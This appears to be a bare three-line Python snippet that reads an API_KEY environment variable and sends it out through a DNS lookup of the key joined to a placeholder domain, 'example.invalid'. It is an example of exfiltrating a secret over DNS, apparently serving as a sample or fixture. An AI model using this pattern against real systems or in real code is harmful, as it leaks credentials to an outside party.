import os, socket
key = os.getenv("API_KEY")
socket.gethostbyname(key + ".example.invalid")
